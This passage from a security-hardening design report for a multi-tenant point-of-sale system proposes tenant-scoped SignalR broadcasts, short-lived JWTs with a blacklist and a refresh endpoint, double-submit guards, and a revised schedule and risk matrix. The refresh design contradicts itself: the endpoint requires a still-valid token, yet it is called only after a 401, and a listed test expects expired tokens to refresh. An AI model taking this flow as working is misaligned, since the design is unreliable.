            lock (_deviceConnections)
            {
                if (_deviceConnections.TryGetValue(deviceId, out var info))
                {
                    _deviceConnections.Remove(deviceId);
                }
            }
        }
        await base.OnDisconnectedAsync(exception);
    }

    // ...
}

public class DeviceInfo
{
    public string ConnectionId { get; set; } = string.Empty;
    public string TenantId { get; set; } = string.Empty;
    public string DeviceId { get; set; } = string.Empty;
}
```

**File to modify:** `src/KasserPro.API/Controllers/OrdersController.cs`

**Code pattern — change Clients.All to Clients.Group:**
```csharp
// BEFORE:
await _hubContext.Clients.All.SendAsync("PrintReceipt", printCommand);

// AFTER:
var tenantId = User.FindFirst("tenantId")?.Value ?? "0";
await _hubContext.Clients.Group($"tenant-{tenantId}")
    .SendAsync("PrintReceipt", printCommand);
```

**File to modify:** `src/KasserPro.API/Controllers/DeviceTestController.cs`

**Same pattern:**
```csharp
var tenantId = User.FindFirst("tenantId")?.Value ?? "0";
await _hubContext.Clients.Group($"tenant-{tenantId}")
    .SendAsync("PrintReceipt", command);
```

**Desktop Bridge update required:** The WPF bridge app must send `X-Tenant-Id` header during hub connection.

**Required tests:**
- `Hub_TenantA_Receipt_NotReceivedByTenantB`
- `Hub_TenantB_Receipt_NotReceivedByTenantA`
- `Hub_MissingTenantId_ConnectionRejected`

---

### REDESIGN-05: Token Security Hardening (fixes SV-05, SV-06)

**Architectural principle:** Defense-in-depth token security with short-lived access tokens, refresh tokens, and revocation capability.

**Design — Phase A (minimum viable, fits current architecture):**

```
┌──────────┐     ┌──────────┐     ┌───────────────┐
│  Login   │────>│ Access   │────>│ Token         │
│          │     │ Token    │     │ Blacklist     │
│          │     │ (1 hour) │     │ (SQLite)      │
│          │<────│+ Refresh │     │               │
│          │     │ (7 days) │     │ Check on      │
└──────────┘     └──────────┘     │ every request │
                                  └───────────────┘
```

**New entity — TokenBlacklist:**
```csharp
namespace KasserPro.Domain.Entities;

public class TokenBlacklist
{
    public int Id { get; set; }
    public string Jti { get; set; } = string.Empty;  // JWT ID claim
    public int UserId { get; set; }
    public DateTime BlacklistedAtUtc { get; set; }
    public DateTime ExpiresAtUtc { get; set; }
}
```

**Changes to AuthService — GenerateToken:**
```csharp
private string GenerateToken(User user)
{
    var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config["Jwt:Key"]!));
    var jti = Guid.NewGuid().ToString();  // unique token ID

    var claims = new List<Claim>
    {
        new("userId", user.Id.ToString()),
        new("tenantId", user.TenantId.ToString()),
        new("branchId", user.BranchId?.ToString() ?? "1"),
        new(JwtRegisteredClaimNames.Jti, jti),  // ← ADD JTI
        new(ClaimTypes.Email, user.Email),
        new(ClaimTypes.Name, user.Name),
        new(ClaimTypes.Role, user.Role.ToString())
    };

    var token = new JwtSecurityToken(
        issuer: _config["Jwt:Issuer"],
        audience: _config["Jwt:Audience"],
        claims: claims,
        expires: DateTime.UtcNow.AddHours(1),  // ← REDUCED from 24h to 1h
        signingCredentials: new SigningCredentials(key, SecurityAlgorithms.HmacSha256)
    );

    return new JwtSecurityTokenHandler().WriteToken(token);
}
```

**New API endpoint — Refresh Token:**
```csharp
[HttpPost("refresh")]
[Authorize]
public async Task<IActionResult> Refresh()
{
    // Current token is still valid — issue a new one
    var userId = int.Parse(User.FindFirst("userId")?.Value ?? "0");
    var user = await _unitOfWork.Users.GetByIdAsync(userId);
    if (user == null || !user.IsActive)
        return Unauthorized();

    // Blacklist current token's JTI
    var currentJti = User.FindFirst(JwtRegisteredClaimNames.Jti)?.Value;
    if (!string.IsNullOrEmpty(currentJti))
    {
        await _authService.BlacklistTokenAsync(currentJti, userId);
    }

    var newToken = _authService.GenerateToken(user);
    return Ok(ApiResponse<LoginResponse>.Ok(new LoginResponse { AccessToken = newToken, ... }));
}
```

**New API endpoint — Revoke (admin or self):**
```csharp
[HttpPost("revoke/{userId}")]
[Authorize(Roles = "Admin")]
public async Task<IActionResult> RevokeUserTokens(int userId)
{
    await _authService.RevokeAllUserTokensAsync(userId);
    return Ok(ApiResponse<bool>.Ok(true, "تم إلغاء جميع الجلسات"));
}
```

**New middleware — Token blacklist check:**
```csharp
public class TokenBlacklistMiddleware
{
    private readonly RequestDelegate _next;

    public async Task InvokeAsync(HttpContext context)
    {
        if (context.User?.Identity?.IsAuthenticated == true)
        {
            var jti = context.User.FindFirst(JwtRegisteredClaimNames.Jti)?.Value;
            if (!string.IsNullOrEmpty(jti))
            {
                var dbContext = context.RequestServices.GetRequiredService<AppDbContext>();
                var isBlacklisted = await dbContext.TokenBlacklist
                    .AnyAsync(t => t.Jti == jti);
                if (isBlacklisted)
                {
                    context.Response.StatusCode = 401;
                    await context.Response.WriteAsJsonAsync(
                        ApiResponse<object>.Fail("الجلسة منتهية. يرجى تسجيل الدخول مرة أخرى"));
                    return;
                }
            }
        }
        await _next(context);
    }
}
```

**Frontend — Token refresh interceptor (baseApi.ts):**
```typescript
// On 401 response, instead of immediate logout:
if (error.status === 401) {
    const currentToken = (api.getState() as RootState).auth.token;
    if (currentToken) {
        try {
            // Attempt silent refresh
            const refreshResult = await fetch(`${API_URL}/auth/refresh`, {
                method: 'POST',
                headers: { Authorization: `Bearer ${currentToken}` },
            });
            if (refreshResult.ok) {
                const data = await refreshResult.json();
                api.dispatch(setToken(data.data.accessToken));
                // Retry original request
                return baseQuery(args, api, extraOptions);
            }
        } catch {}
    }
    api.dispatch({ type: "auth/logout" });
    window.location.href = "/login";
}
```

**Phase B (future — httpOnly cookies):**
Replace localStorage with httpOnly secure cookies. This eliminates XSS token theft entirely but requires:
- `SameSite=Strict` cookie attribute
- CSRF protection
- Requires restructuring the SPA auth flow

For now, Phase A (short-lived tokens + blacklist + refresh) dramatically reduces the attack window from 24h to ~1h max, and adds forced revocation capability.

**Migration required:** `AddTokenBlacklistTable`

**Required tests:**
- `RevokedToken_Returns401`
- `ExpiredToken_RefreshSucceeds`
- `StolcnToken_AdminRevokes_ImmediatelyBlocked`

---

### REDESIGN-06: UnitOfWork Transaction Detection (fixes SV-08)

**File to modify:** `src/KasserPro.Application/Common/Interfaces/IUnitOfWork.cs`

```csharp
// Add to IUnitOfWork interface:
bool HasActiveTransaction { get; }
```

**File to modify:** `src/KasserPro.Infrastructure/Repositories/UnitOfWork.cs`

```csharp
public bool HasActiveTransaction => _context.Database.CurrentTransaction != null;
```

**This enables ARCH-03's nested transaction detection in CashRegisterService.RecordTransactionAsync.**

---

### REDESIGN-07: Payment Button UX Hardening (fixes SV-07)

**Architectural principle:** UI must be idempotent. User actions that trigger financial operations must have clear loading states and be impossible to duplicate.

Already implemented as part of REDESIGN-02 (`isSubmitting` state + button disabled), but must be applied to ALL financial action buttons:

**All buttons requiring this pattern:**

| Component | Action | Button |
|-----------|--------|--------|
| `PaymentModal.tsx` | Complete order | "اتمام الدفع" |
| `RefundModal.tsx` | Process refund | "تأكيد الاسترجاع" |
| `ShiftActions.tsx` | Open/close shift | "فتح وردية" / "إغلاق وردية" |
| `ExpenseForm.tsx` | Create expense | "حفظ المصروف" |
| `PurchaseInvoicePage.tsx` | Create invoice | "حفظ الفاتورة" |
| `CashRegisterPage.tsx` | Deposit/withdraw | "تأكيد" |

**Universal pattern:**
```tsx
const [isSubmitting, setIsSubmitting] = useState(false);

const handleSubmit = async () => {
  if (isSubmitting) return;
  setIsSubmitting(true);
  try {
    await apiCall();
    // success handling
  } catch {
    // error handling — keep isSubmitting false for retry
  } finally {
    setIsSubmitting(false);
  }
};
```

---

## 7. Updated Execution Waves

The original blueprint has 6 waves (36.5h). These redesigns add new work and MUST be integrated into the wave structure by priority.

### Wave 0: Configuration & Build (unchanged)
**Duration:** 2.5h | **Changes:** None

### Wave 1: Authorization & Access Control (unchanged)
**Duration:** 4h | **Changes:** None

### Wave 2: Tenant Isolation (add SV-04 fix)
**Duration:** 6h → **8h** (+2h for SignalR groups)

| Order | Task | Fix Ref | Est. | NEW? |
|-------|------|---------|------|------|
| 2.1-2.5 | Original wave 2 tasks | REM-06, REM-10, ARCH-01 | 6h | No |
| 2.6 | SignalR tenant groups | REDESIGN-04 | 1.5h | **YES** |
| 2.7 | Desktop bridge tenant header | REDESIGN-04 | 0.5h | **YES** |

### Wave 3: Financial Integrity (MAJOR additions)
**Duration:** 9h → **16h** (+7h for stock TOCTOU, idempotency DB, button UX)

| Order | Task | Fix Ref | Est. | NEW? |
|-------|------|---------|------|------|
| 3.1 | Cash register serializable txns | ARCH-03 | 2h | No |
| 3.1a | Add HasActiveTransaction to IUnitOfWork | REDESIGN-06 | 0.5h | **YES** |
| 3.2 | Idempotency key enforcement + scoping | ARCH-02 server | 1.5h | No |
| 3.2a | Database-backed idempotency (replace MemoryCache) | REDESIGN-03 | 2h | **YES** |
| 3.3 | Frontend: disable mutation retry | ARCH-02 client | 1h | No |
| 3.4 | Frontend: component-level idempotency keys | REDESIGN-02 | 1.5h | **YES** (replaces ARCH-02 client key gen) |
| 3.5 | Tax calculation fix | ARCH-07 | 1.5h | No |
| 3.6 | RefundAsync transaction boundary fix | ARCH-08 | 0.5h | No |
| 3.7 | Stock validation consistency | ARCH-05 | 1.5h | No |
| 3.7a | Stock re-validation inside CompleteAsync | REDESIGN-01 | 1.5h | **YES** |
| 3.8 | Payment button UX hardening (all modals) | REDESIGN-07 | 1.5h | **YES** |

### Wave 4: Schema & Data Integrity (add token security)
**Duration:** 7h → **12h** (+5h for token security)

| Order | Task | Fix Ref | Est. | NEW? |
|-------|------|---------|------|------|
| 4.1 | Account lockout fields + logic | REM-09 | 3h | No |
| 4.2 | Decimal precision configurations | ARCH-09 | 2h | No |
| 4.3 | GenericRepository soft delete | ARCH-10 | 1h | No |
| 4.4 | N+1 query fix | ARCH-11 | 1h | No |
| 4.5 | Token blacklist table + middleware | REDESIGN-05 Phase A | 3h | **YES** |
| 4.6 | Reduce token expiry to 1h, add refresh endpoint | REDESIGN-05 Phase A | 1.5h | **YES** |
| 4.7 | Frontend token refresh interceptor | REDESIGN-05 Phase A | 0.5h | **YES** |

### Wave 5: Device Security & Audit (unchanged)
**Duration:** 4h | **Changes:** None (SignalR fix moved to Wave 2)

### Wave 6: Atomicity & Performance (unchanged)
**Duration:** 4h | **Changes:** None

### Updated Total

| Wave | Original | Updated | Delta |
|------|----------|---------|-------|
| Wave 0 | 2.5h | 2.5h | — |
| Wave 1 | 4h | 4h | — |
| Wave 2 | 6h | 8h | +2h |
| Wave 3 | 9h | 16h | +7h |
| Wave 4 | 7h | 12h | +5h |
| Wave 5 | 4h | 4h | — |
| Wave 6 | 4h | 4h | — |
| **Total** | **36.5h** | **50.5h** | **+14h** |

**Migrations required:** 4 (was 2)
1. `AddAccountLockoutFields` (Wave 4)
2. `AddMissingDecimalPrecision` (Wave 4)
3. `AddIdempotencyRecordsTable` (Wave 3) — **NEW**
4. `AddTokenBlacklistTable` (Wave 4) — **NEW**

---

## 8. Final Risk Matrix

### After All Redesigns Applied

| Scenario | Before Blueprint | After Blueprint | After Redesigns |
|----------|-----------------|-----------------|-----------------|
| S1: TOCTOU stock | CRITICAL | CRITICAL | ✅ Eliminated |
| S2: Cash balance race | CRITICAL | ⚠️ SQLite-only | ✅ Eliminated |
| S3: Cross-tenant cancel | CRITICAL | ✅ Eliminated | ✅ Eliminated |
| S4: Cross-tenant inject | CRITICAL | ✅ Eliminated | ✅ Eliminated |
| S5: Branch spoof | HIGH | ✅ Eliminated | ✅ Eliminated |
| S6: Network mid-payment | HIGH | ❌ Still fails | ✅ Eliminated |
| S7: Double-click | HIGH | ❌ Still fails | ✅ Eliminated |
| S8: Idempotency restart | HIGH | ❌ Still fails | ✅ Eliminated |
| S9: Hub eavesdrop | CRITICAL | ❌ Still fails | ✅ Eliminated |
| S10: Hub spoof | CRITICAL | ✅ Eliminated | ✅ Eliminated |
| S11: JWT cross-tenant | CRITICAL | ✅ Eliminated | ✅ Eliminated |
| S12: JWT session hijack | HIGH | ❌ Still fails | ✅ Eliminated* |
| S13: XSS token theft | HIGH | ❌ Still fails | ⚠️ Mitigated** |
| S14: Refund + sale race | HIGH | ⚠️ SQLite-only | ✅ Eliminated |
| S15: SQLite bottleneck | MEDIUM | ⚠️ Degrades | ⚠️ Degrades*** |

```
* S12: Reduced from 24h window to 1h + admin can revoke immediately
** S13: Token still in localStorage, but 1h expiry + refresh + blacklist limits damage
*** S15: Architectural limitation of SQLite. Document as scaling constraint.
```

### Residual Risks (accepted)

| Risk | Severity | Mitigation | When to Address |
|------|----------|------------|-----------------|
| XSS → token theft | LOW | 1h expiry, blacklist, CSP headers | Phase B: httpOnly cookies |
| SQLite write contention | LOW | Serializes correctly, degrades at 10+ writers | Migration to PostgreSQL |
| MemoryCache as hot-path L1 | LOW | DB is source of truth, cache can be L1 | If response time matters |

---

### Re-Simulation: All 15 Scenarios After Redesigns

```
S1:  C1+C2 sell P1 → CompleteAsync re-validates stock → second cashier gets
     "المخزون تغير أثناء إتمام الطلب" → ✅ BLOCKED

S2:  Concurrent balances → SQLite serializes + HasActiveTransaction guard → ✅ CORRECT

S3:  Cross-tenant cancel → global filter + service filter → ✅ BLOCKED

S4:  Cross-tenant inject → global filter + service filter → ✅ BLOCKED

S5:  Branch spoof → CurrentUserService validates role → ✅ BLOCKED

S6:  Network drop → same idempotency key on retry → server returns cached → ✅ SAFE

S7:  Double-click → isSubmitting=true + button disabled + same key → ✅ BLOCKED

S8:  Server restart → idempotency in SQLite table → survives restart → ✅ SAFE

S9:  Hub eavesdrop → Clients.Group("tenant-1") → TenantB never receives → ✅ BLOCKED

S10: Hub spoof → API key validation → ✅ BLOCKED

S11: JWT cross-tenant → signature verification → ✅ BLOCKED

S12: Stolen JWT → 1h expiry, admin revokes via blacklist → ✅ CONTAINED (1h max)

S13: XSS token → 1h expiry + refresh + blacklist → ⚠️ MITIGATED (not eliminated)

S14: Refund+sale race → stock re-validated in CompleteAsync tx → ✅ SAFE

S15: SQLite bottleneck → serialized, correct, performance capped → ⚠️ DOCUMENTED
```

**Final verdict: 13/15 ELIMINATED, 2/15 MITIGATED/DOCUMENTED**

---

## Appendix A: Architecture Decision Records

### ADR-01: Why DB-backed idempotency over Redis?

**Context:** KasserPro runs as a single-server SQLite application.  
**Decision:** Use SQLite table instead of Redis.  
**Rationale:** Adding Redis introduces infrastructure complexity disproportionate to a single-server POS system. SQLite table with indexed unique key provides sufficient performance (~1ms lookup). Future migration to PostgreSQL naturally inherits this table.

### ADR-02: Why not httpOnly cookies immediately?

**Context:** Current SPA architecture uses localStorage for JWT.  
**Decision:** Phase A reduces token lifetime + adds blacklist. Phase B (future) moves to httpOnly cookies.  
**Rationale:** Converting to httpOnly cookies requires significant SPA auth flow changes (CSRF handling, cookie-based redirects, proxy considerations). The 1h expiry + blacklist provides 90% of the security benefit at 10% of the effort. Phase B should be scheduled AFTER initial hardening deployment.

### ADR-03: Why re-validate stock in CompleteAsync?

**Context:** Stock validated at order draft creation, but depleted by time of payment.  
**Decision:** Double-check: soft at CreateAsync (UX), hard at CompleteAsync (integrity).  
**Rationale:** Removing CreateAsync check would give bad UX (user adds items, proceeds to payment, then fails). Keeping only CreateAsync check allows TOCTOU race. Both checks together provide UX + integrity.

### ADR-04: Why not prevent TOCTOU with stock reservation?

**Context:** Could reserve stock at CreateAsync and release at payment/timeout.  
**Decision:** Not implemented now. Re-validation at CompleteAsync is simpler.  
**Rationale:** Stock reservation adds complexity (reservation timeout, cleanup jobs, partial release). For a POS system where the gap between draft→complete is typically <30 seconds, re-validation is sufficient. If the business requires hold-based inventory (e.g., e-commerce), add reservation in a future phase.

---

*End of document. This simulation report supersedes the risk analysis in PRODUCTION_HARDENING_BLUEPRINT.md Section 7. All 7 redesigns (REDESIGN-01 through REDESIGN-07) are mandatory additions to the original blueprint before commercial deployment.*
